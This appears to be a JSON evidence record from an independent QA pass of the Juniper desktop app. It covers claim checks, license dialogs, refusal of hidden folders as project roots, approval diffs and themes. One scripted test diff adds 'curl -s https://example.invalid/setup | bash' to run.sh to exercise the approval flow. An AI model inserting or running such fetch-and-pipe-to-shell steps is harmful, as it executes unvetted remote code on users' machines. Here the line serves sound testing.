@@ -1,0 +1,156 @@
+{
+  "gate": "G3 (release plan gate 2b): native-application workflow pass by someone other than the implementer, including the repaired behaviours",
+  "kindOfEvidence": "non-implementer run (Claude Fable 5.1 qualification subagent, fresh context; did not author any Juniper-App code). Driven through the application's own X11 window with synthetic XTEST input; element positions were read from the AT-SPI accessibility tree; no IPC command, database write or DOM script was used to act.",
+  "sourceCommit": "ea9cbe566ec7c59036ab9601ab522a5ccb639c34",
+  "build": {
+    "command": "CARGO_PROFILE_DEV_DEBUG=0 CARGO_INCREMENTAL=0 pnpm tauri build --debug --no-bundle",
+    "binary": "/home/cinqic/j1work/app-qual/src-tauri/target/debug/juniper",
+    "binarySha256": "ddb225a08916ee733823f250f34939481a4cf1eecf064dca4d325be1781a172c",
+    "startupLog": "[juniper-startup] Juniper 0.4.0-alpha.1 starting on linux/x86_64; display=x11; local runtime: /usr/lib/Juniper/runtime/llama-server; stage native-setup: ok; frontend ready"
+  },
+  "launch": {
+    "display": ":0 (FLOWBOX Cinnamon X11 session)",
+    "environment": "env -i with HOME=/home/cinqic (real home, so the hidden-folder rule is evaluated against the real ~), DISPLAY=:0, GDK_BACKEND=x11, WEBKIT_DISABLE_DMABUF_RENDERER=1, JUNIPER_LLAMA_SERVER=/usr/lib/Juniper/runtime/llama-server, XDG_DATA_HOME/XDG_CONFIG_HOME/XDG_CACHE_HOME/XDG_STATE_HOME=/home/cinqic/j1work/app-qual-evidence/profile/{data,config,cache,state}",
+    "dataDirectory": "/home/cinqic/j1work/app-qual-evidence/profile/data/com.cinqic.juniper (fresh; juniper.db created at launch)",
+    "ownerDataUntouched": "/home/cinqic/.local/share/com.cinqic.juniper/juniper.db size 299008, mtime 2026-10-15 11:38:01 EDT before and after; nothing named juniper under ~/.config",
+    "runWindow": "6:26 AM to 6:49 AM EDT, Saturday, October 17, 2026",
+    "shutdown": "window closed with wmctrl -c; process exited; no llama-server child left behind"
+  },
+  "modelForAgentTasks": {
+    "primary": "scripted OpenAI-compatible fixture provider (tools/scripted_provider.py) on http://127.0.0.1:18080/v1, model id qual-scripted-fixture, added through Settings > Connections > Add connection and discovered through Models > From your connections > Refresh. It is not a model: each reply is fixed by a [QA-*] tag in the task goal, so the host behaviour under test (claim check, approval cards, protected-path refusal) is exercised deterministically. The repository documents no mock provider; this one was written for this run and its request log is scripted-provider.jsonl.",
+    "whyNotALocalModel": "the isolated profile started with no model installed; after workflow (b) installed Llama 3.2 1B Instruct and Gemma 3 1B IT, one additional attempt with the real Llama 3.2 1B Instruct is recorded as workflow (a2)",
+    "qualification": "shown in the composer as 'Not qualified for tools'; 'Allow an unqualified model' was switched on in Agent settings (as the implementer did)"
+  },
+  "project": {
+    "id": "project-01ae6d92-2e81-414b-97a5-87c4bb8d4565",
+    "name": "Qualification project",
+    "rootGranted": "/home/cinqic/j1work/app-qual-evidence/project-root (read and write), label project-root",
+    "fixtureFilesBefore": {"package.json": "b6567a46f2185f3c3a6161d09699c9ac7090c1108040a5b5e0dba51ead9a8ccf", "run.sh": "b0918f0b41d391df58102f8522a03775330f1a9c9fe904c68ac19f540d541a09", "notes.txt": "9ab542eb3109a60138467d37b57021973c1e3aaa3042c87f22bda75a18e40c02"},
+    "permissionPreset": "Within projects (profile autonomy 'project') for every agent task below"
+  },
+  "workflows": [
+    {
+      "id": "a",
+      "title": "Tool-free answer claiming a save ends as Needs review, never Completed",
+      "taskId": "task-396e30ee-cf08-4fae-9126-e23f8f9b325f",
+      "goal": "[QA-A] Read the files in the project folder and save a one-paragraph summary as summary.md in the project folder.",
+      "modelReply": "The summary has already been saved as `summary.md` in the project folder. It lists the key dates and costs from the project files. (no tool call; scripted)",
+      "toolsOfferedToModel": ["calculator.evaluate", "datetime.current", "unit.convert", "task.update_plan", "task.ask_user", "artifact.create", "artifact.read", "workspace.list", "workspace.read", "workspace.search", "workspace.write", "project.search", "memory.list", "schedule.create"],
+      "observed": {
+        "statusChipInTaskView": "Needs review (amber outlined chip next to '✦ Juniper ·')",
+        "statusLineUnderTitle": "The answer says it saved or changed a file, but no tool in this task did that. Check the result before relying on it.",
+        "resultCardHeading": "Needs review",
+        "resultCardNote": "Not done by Juniper: the answer says it saved or changed a file, but no tool in this task did that. Check before relying on it.",
+        "activityEvents": ["6:33 AM Queued", "6:33 AM Running", "6:33 AM Needs review — The answer says it saved or changed a file, but no tool in this task did that. Check the result before relying on it."],
+        "taskListChip": "Needs review (Recent list, screenshot 19)",
+        "inboxRow": "● Needs review: [QA-A] Read the files in the project folder and save a one-paragraph summary as … · 10/17/2026, 6:33:16 AM, body = the model's sentence (Permissions > Activity inbox, screenshot 20)",
+        "database": "tasks.status=completed, result.outcome=needs-review, status_reason as above; inbox row kind=review; task_actions empty (toolCalls 0)",
+        "disk": "no summary.md in the project folder (ls before and after)"
+      },
+      "labelCompletedShownAnywhere": false,
+      "screenshots": ["16-task-a-composer.png", "17-task-a-result.png", "18-task-a-activity.png", "19-task-list-needs-review.png", "20-inbox-needs-review.png"],
+      "outcome": "PASS"
+    },
+    {
+      "id": "a-control",
+      "title": "Control: an answer with no effect claim ends Completed",
+      "taskId": "task-09f30e4e-df4b-4d86-a1e5-855a65c36280",
+      "goal": "[QA-OK] Tell me what is in the project folder without changing anything.",
+      "modelReply": "The project folder holds a package manifest and a run script; nothing was changed. (no tool call; scripted)",
+      "observed": {"statusChip": "Completed (green)", "resultCardHeading": "Answer", "database": "status=completed, result.outcome=answer"},
+      "screenshots": ["26-task-ok-control-completed.png"],
+      "outcome": "PASS"
+    },
+    {
+      "id": "a2",
+      "title": "Attempt with the real local model Llama 3.2 1B Instruct (Q4_K_M, bundled llama-server)",
+      "taskId": "task-f7952d92-3b63-413f-b04c-fe061567138c",
+      "goal": "Save a one-paragraph note about why the sky is blue as summary.md in my project folder. (no project selected)",
+      "observed": {
+        "statusChip": "Failed (red)",
+        "statusLine": "Stopped before finishing. It reached its limit of 16 model steps.",
+        "activity": "16 × 'Invalid arguments: unexpected “artifactId”.' then 'Failed — Stopped before finishing. It reached its limit of 16 model steps.'",
+        "actions": "16 × artifact.create failed with INVALID_TOOL_ARGUMENT (the 1B model kept passing an unknown artifactId argument)",
+        "database": "status=failed, result.outcome=partial"
+      },
+      "assessment": "The unqualified 1B model never produced a final answer, so this attempt neither confirms nor contradicts the claim check; it shows the host's step budget (16) bounding a looping model and marking the task Failed, not Completed. Not repeated; the scripted provider is the evidence for (a).",
+      "screenshots": ["44-real-model-llama-task.png", "45-real-model-llama-activity.png"],
+      "outcome": "INCONCLUSIVE for the claim check (host bound observed)"
+    },
+    {
+      "id": "b",
+      "title": "Host-backed license dialog before a gated catalog download; Gemma's fingerprinted terms asked again on a second download",
+      "steps": [
+        {"step": "Models > All > search 'Llama 3.2 1B' > Version Q4_K_M · 808 MB > Download · 808 MB", "observed": "Dialog 'Accept the Llama 3.2 Community License?' with 'Llama 3.2 1B Instruct is distributed under the Llama 3.2 Community License. Review the terms before downloading. Juniper's own Apache-2.0 license does not apply to the model.', link 'Review the Llama 3.2 Community License', 'Terms revision: 9213176726f574b556790deb65791e0c5aa438b6.', buttons Cancel / Accept and download. model-licenses.json did not exist before the click.", "screenshot": "27-license-dialog-llama.png"},
+        {"step": "Accept and download", "observed": "model-licenses.json created in the app data folder with llama-3.2-1b-instruct {license, licenseUrl, termsRevision 9213176726f574b556790deb65791e0c5aa438b6, acceptedAt 2026-10-17T10:37:40Z}; llama-3.2-1b-instruct-q4-k-m.gguf.part growing", "screenshot": "28-llama-downloading.png"},
+        {"step": "search 'Gemma 3 1B' > Version Q4_K_M · 806 MB > Download · 806 MB", "observed": "Dialog 'Accept the Gemma Terms of Use?' with 'Catalog fingerprint: gemma-terms-2026-04-01-sha256-971c1f26bda668f56567a7545df993d297b6f331ce9d2ad677ee0… It identifies a reported response hash, but the historical response is not bundled and cannot be verified against the linked page. Review the linked page before each download or import; Juniper does not save acceptance for these mutable terms.'", "screenshot": "29-license-dialog-gemma-first.png"},
+        {"step": "Accept and download", "observed": "model-licenses.json unchanged (still only the Llama entry; grep -c gemma = 0); gemma-3-1b-it-q4-k-m.gguf.part growing; the running Llama download was paused by the frontend ('Download paused. It resumes from where it stopped.' banner), see observations", "screenshot": "30-gemma-first-downloading.png"},
+        {"step": "Gemma 3 1B IT > Version Q8_0 · 1.1 GB > Download · 1.1 GB (second Gemma download)", "observed": "The same 'Accept the Gemma Terms of Use?' dialog appeared again with the fingerprint text; Cancel chosen; no q8 partial file created; model-licenses.json still has no Gemma entry", "screenshot": "31-license-dialog-gemma-second.png"},
+        {"step": "Gemma Q4_K_M download finished", "observed": "gemma-3-1b-it-q4-k-m.gguf 806,058,240 B; SHA-256 8ccc5cd1f1b3602548715ae25a66ed73fd5dc68a210412eea643eb20eb75a135 = catalog pin (checked with sha256sum)", "screenshot": "32-gemma-installed.png"},
+        {"step": "Llama 3.2 1B Instruct > Resume download (first attempt, 6:40 AM)", "observed": "no dialog (acceptance on record); banner 'Download failed.' with no error code; partial file unchanged at 469,186,318 B; see observations", "screenshot": "34-llama-resumed-installed.png"},
+        {"step": "Resume download (second attempt, 6:44:27 AM)", "observed": "no dialog; partial grew from 469,186,318 B (481 MB at +2 s, 696 MB at +18 s) to completion; llama-3.2-1b-instruct-q4-k-m.gguf 807,694,368 B; SHA-256 3f5a22426976ab26cfe84dba63c1d08391717abb1af893e10f1b2968d862dcc1 = catalog pin", "screenshot": "37-llama-installed.png"},
+        {"step": "Control: Llama 3.2 1B Instruct > Version Q8_0 · 1.3 GB > Download · 1.3 GB (second Llama download)", "observed": "no license dialog (non-fingerprinted terms are saved once); download started immediately (progress bar 'Llama 3.2 1B Instruct download', 6 %, 'Pause download' button; q8 partial 16.7 MB at +2 s, 79.9 MB at +6 s); then 'Pause download' pressed and the partial left paused", "screenshot": "38-llama-q8-second-download-no-dialog.png"}
+      ],
+      "hostRecordAfterRun": {"llama-3.2-1b-instruct": {"license": "Llama 3.2 Community License", "licenseUrl": "https://huggingface.co/meta-llama/Llama-3.2-1B-Instruct/blob/9213176726f574b556790deb65791e0c5aa438b6/LICENSE.txt", "termsRevision": "9213176726f574b556790deb65791e0c5aa438b6", "acceptedAt": "2026-10-17T10:37:40Z"}, "gemma": "absent"},
+      "outcome": "PASS (dialog before the gated download, served from the host record; Gemma asked again on the second download and never saved; Llama not asked again)"
+    },
+    {
+      "id": "c",
+      "title": "Hidden home folders refused as project roots with ROOT_REFUSED; ordinary temp folder accepted",
+      "steps": [
+        {"step": "Agent > Projects > New project 'Qualification project' > Save", "screenshot": "08-project-created.png"},
+        {"step": "Grant a folder (read and write) > native GTK chooser 'Choose a folder for this project' > typed /home/cinqic/.config and confirmed", "observed": "Modal 'Something went wrong': 'Juniper does not grant a hidden configuration folder in your home folder to a project. Choose a specific project folder.' (the native error is 'ROOT_REFUSED: Juniper does not grant a hidden configuration folder in your home folder to a project. Choose a specific project folder.'; src/lib/agent.ts errorText strips the CODE: prefix for display). No project_roots row.", "screenshots": ["09-folder-picker-config.png", "10-root-refused-config.png"]},
+        {"step": "Grant a folder (read and write) > typed /home/cinqic/.ssh and confirmed", "observed": "same refusal text; no project_roots row", "screenshots": ["11-folder-picker-ssh.png", "12-root-refused-ssh.png"]},
+        {"step": "Grant a folder (read and write) > typed /home/cinqic/j1work/app-qual-evidence/project-root and confirmed", "observed": "accepted: row 'project-root /home/cinqic/j1work/app-qual-evidence/project-root Read and write' with a Remove button; project_roots row id root-… access read-write", "screenshots": ["13-folder-picker-project-root.png", "14-root-accepted.png"]}
+      ],
+      "outcome": "PASS"
+    },
+    {
+      "id": "d",
+      "title": "Under 'Within projects', writes to package.json and run.sh need a per-call approval with a diff; .bashrc is refused outright",
+      "preset": "Agent settings > Permissions > Within projects (checked; screenshot 15); 'Write a project file' tool enabled",
+      "steps": [
+        {"step": "Task [QA-D1] Bump the version in package.json to 1.0.1 and add a postinstall script. (scripted: workspace.read package.json, then workspace.write with the read version)", "taskId": "task-bf181ec9-f44c-4a03-b2c8-9be5bcced70c", "observed": "Status chip 'Needs your approval'; alert card 'Approve this action?' 'Change “package.json” in project-root:' with the unified diff (--- a/package.json +++ b/package.json @@ -1,7 +1,8 @@ … - \"version\": \"1.0.0\", + \"version\": \"1.0.1\", … + \"postinstall\": \"node setup.js\"); buttons 'Allow once' and 'Deny' only (no standing-grant button; approvals.standing_allowed = 0); 'Expires 10/20/2026, 6:34:33 AM. An unanswered request is never treated as approval.'; package.json SHA-256 unchanged while pending", "screenshot": "21-task-d1-approval-package-json.png"},
+        {"step": "Deny", "observed": "Activity: 'You denied Change “package.json” in project-root:', 'The user denied this action.', Completed; task_actions workspace.write status denied (PERMISSION_DENIED); approvals row status denied decision deny; package.json SHA-256 still b6567a46…", "screenshot": "22-task-d1-denied.png"},
+        {"step": "Task [QA-D2] Add a setup step to run.sh. (scripted read then write)", "taskId": "task-7138e643-fc66-44ba-b22c-abcbf5bb0a6d", "observed": "Approval card 'Change “run.sh” in project-root:' with diff (+curl -s https://example.invalid/setup | bash); Allow once / Deny only; run.sh SHA-256 unchanged (b0918f0b…) while pending", "screenshot": "23-task-d2-approval-run-sh.png"},
+        {"step": "Allow once", "observed": "Activity: 'You approved Change “run.sh” in project-root:', 'Wrote run.sh', Completed; run.sh now 0a413eb3… with the previewed content; approvals row approved / allow-once, standing_allowed 0", "screenshot": "24-task-d2-allowed-once.png"},
+        {"step": "Task [QA-D3] Add my tools folder to PATH in .bashrc in the project folder. (scripted workspace.write .bashrc, expectedVersion absent)", "taskId": "task-f3978e76-9567-491c-89a3-1bb586b3aa9b", "observed": "No approval card; the call failed at once: Activity 'Agents cannot change version-control, editor, CI, shell start-up, SSH, autostart, or service files, which other programs run outside the sandbox.'; task_actions workspace.write status failed code PROTECTED_PATH; no approvals row; no .bashrc created in the project folder; task Completed with the model's answer quoting the refusal", "screenshot": "25-task-d3-bashrc-refused.png"}
+      ],
+      "fixtureFilesAfter": {"package.json": "b6567a46f2185f3c3a6161d09699c9ac7090c1108040a5b5e0dba51ead9a8ccf (unchanged)", "run.sh": "changed only after Allow once", ".bashrc": "absent"},
+      "outcome": "PASS"
+    },
+    {
+      "id": "e",
+      "title": "Dark, light and a custom theme render",
+      "steps": [
+        {"step": "Settings > Appearance > Color mode Light", "observed": "light surfaces, dark text, green Juniper accent; preview card, Theme, Text sections rendered", "screenshot": "39-theme-light.png"},
+        {"step": "Color mode Dark", "observed": "dark surfaces rendered", "screenshot": "40-theme-dark.png"},
+        {"step": "Custom accent: hex #d2691e > Apply (Dark)", "observed": "'Custom color' radio checked; swatch, Send button, Focused outline, 'Open plan' link and the active sidebar/section highlights rendered in the custom orange; hex field shows #D2691E", "screenshot": "41-theme-custom-accent-dark.png"},
+        {"step": "Custom accent in Light, then the Agent screen", "observed": "custom accent carried across screens (Agent task list, Start task button, Needs review chip still amber)", "screenshots": ["42-theme-custom-accent-light.png", "43-theme-custom-accent-light-agent.png"]},
+        {"step": "Reset to Dark + Juniper accent", "observed": "app_settings.theme = dark persisted in the isolated database"}
+      ],
+      "outcome": "PASS"
+    }
+  ],
+  "observations": [
+    "Starting a second catalog download while one is running pauses the first (frontend aborts the previous controller; banner 'Download paused. It resumes from where it stopped.'). The paused Llama download kept a 469,186,318-byte partial and a journal and showed 'Resume download' / 'Remove'. Resuming worked on the second attempt; the first attempt showed 'Download failed.' with no reason.",
+    "ModelsScreen.tsx download()/importFile() show the generic 'Download failed.' whenever the rejection is not an Error instance, which is the case for every native string error from the download command (MODEL_DOWNLOAD_ERROR, MODEL_BUSY, INSUFFICIENT_STORAGE …); the code and message are lost in the Models screen (the Agent screen uses errorText and keeps the message). Low-severity UI finding; not a gate item.",
+    "While a second artifact of an installed entry downloads, the card shows both 'Downloaded and verified' (for the installed artifact) and the new progress bar under the same heading (screenshot 38); ambiguous but not wrong.",
+    "'Free storage' on the Models screen did not refresh after downloads (6.1 GB throughout), as the implementer already recorded.",
+    "The GTK folder chooser's path completion popup covers the Open button; confirming by Return in the location entry works.",
+    "AT-SPI 'impl_GetExtents: assertion ATK_IS_COMPONENT failed' CRITICAL lines in the app's stderr are from the accessibility queries made by the driver, not from app actions.",
+    "A transient rendering artifact (horizontal line across the sidebar) appeared in one frame (screenshot 10) with WEBKIT_DISABLE_DMABUF_RENDERER=1 on the NVIDIA desktop; not reproduced in later frames."
+  ],
+  "notDriven": [
+    "Documents viewer, web research skill, schedules, MCP server, delegation and crash recovery (covered by the implementer's record; not in this brief).",
+    "Windows, Android, Wayland (not available on FLOWBOX; disclosed in the release plan).",
+    "A real model producing a tool-free save claim: the only installed small models are unqualified for tools; one attempt looped and was bounded by the host (workflow a2)."
+  ],
+  "rawFiles": {
+    "db-export.json": "read-only export of tasks, task_events, task_actions, approvals, inbox, projects, project_roots, provider_profiles, agent_profiles and model-licenses.json from the isolated database after the run",
+    "scripted-provider.jsonl": "every request the app made to the scripted provider and the fixed reply it got",
+    "app.log": "the app's stdout/stderr",
+    "tools/xdrive.py": "X11/AT-SPI driver used for input and screenshots",
+    "tools/scripted_provider.py": "the fixture provider"
+  }
+}
